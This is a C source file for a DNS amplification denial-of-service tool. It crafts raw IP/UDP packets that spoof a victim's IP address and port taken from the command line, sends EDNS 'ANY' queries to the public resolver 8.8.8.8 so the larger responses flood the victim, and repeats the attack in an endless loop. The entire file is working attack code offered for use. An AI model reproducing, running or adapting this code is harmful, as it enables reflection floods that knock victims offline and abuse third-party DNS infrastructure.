#include "dnsAmplificationAttack.h"
#include <string.h>

unsigned short checkSum(unsigned short *ptr, int numBytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(numBytes>1) {
		sum+=*ptr++;
		numBytes-=2;
	}
	if(numBytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void querySiteFormat(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

// Creates the dns header and packet
void dnsHeaderCreate(dnsHeader *dns)
{
	dns->id = (unsigned short) htons(getpid());
	dns->flags = htons(0x0120);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	dns->add = htons(1);
}

void eDnsHeaderCreate(eDnsHeader *eDns){
	eDns->name = 0;
	eDns->type = htons(41);
	eDns->udpPayloadSize = htons(0x1000);
	eDns->higherBits = 0;
	eDns->eDnsVersion = 0;
	eDns->z = 0;
	eDns->dataLength = 0;
}

void ipHeaderCreate(iph *ip){
	ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    
}

void queryset(query *q){
	q->qtype = htons(0x00ff);
	q->qclass = htons(0x1);
}

void dnsAmplificationAttack(char *victimIp, int victimPort)
{
	printf("dnsHeaer size: %ld\n", sizeof(dnsHeader)); //12
	printf("query size: %ld\n", sizeof(query)); //4
	printf("iph size: %ld\n", sizeof(iph));	//20
	printf("udph size: %ld\n", sizeof(udph)); //8
	printf("eDnsHeader size: %ld\n", sizeof(eDnsHeader)); //11
	printf("psHeader size: %ld\n", sizeof(psHeader)); //12


	char *dnsIp = "8.8.8.8";
	int dnsPort = 53;
		
	unsigned char dnsRequestPacket[139];
	unsigned char *dnsRecord = "github.com";
	
	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
	dnsHeaderCreate(dns);
	
	unsigned char *dnsName, dnsRcrd[32];
	dnsName = (unsigned char *)&dnsRequestPacket[12];
	strcpy(dnsRcrd, dnsRecord);
	querySiteFormat(dnsName , dnsRcrd);
	
	query *q;
	q = (query *)&dnsRequestPacket[12 + (strlen(dnsName)+1)];
	queryset(q);
	

	eDnsHeader *eDns;
	eDns = (eDnsHeader *)&dnsRequestPacket[16 + (strlen(dnsName)+1)];
	eDnsHeaderCreate(eDns);
	
	
	char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
	data = datagram + 28;
    memcpy(data, &dnsRequestPacket, 28 + (strlen(dnsName)+1));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dnsPort);
    sin.sin_addr.s_addr = inet_addr(dnsIp);
    
    iph *ip = (iph *)datagram;
    ipHeaderCreate(ip);
    ip->tot_len = 55 + (strlen(dnsName)+1);
    ip->saddr = inet_addr(victimIp);
	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
	ip->daddr = sin.sin_addr.s_addr;
	
    udph *udp = (udph *)(datagram + 20);
	udp->source = htons(victimPort);
    udp->dest = htons(dnsPort);
    udp->len = htons(35 + (strlen(dnsName)+1));
    udp->check = 0;
	
	// Pseudoheader creation and checksum calculation
	psHeader pshdr;
	pshdr.saddr = inet_addr(victimIp);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(35 + (strlen(dnsName)+1));

	int pssize = 47 + (strlen(dnsName)+1);
    psgram = malloc(pssize);
	
    memcpy(psgram, (char *)&pshdr, 12);
    memcpy(psgram + 12, udp, 35 + (strlen(dnsName)+1));
		
    udp->check = checkSum((unsigned short *)psgram, pssize);
    
    // Send data
    int status = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(status == -1) printf("Could not create socket.\n");
    else sendto(status, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
	free(psgram);
	close(status);
	
	return;
}

int main(int argc, char **argv)
{	
	if(getuid()!=0)
		printf("You must be running as root!\n");
	if(argc<3)
		printf("Usage: %s victimIp victimPort\n", argv[0]);
	
	char *victimIp = argv[1];
	int victimPort = atoi(argv[2]);
	
	while(1) {
		printf("dns send\n");
		dnsAmplificationAttack(victimIp, victimPort);
		sleep(5);
	}	

	return 0;
}
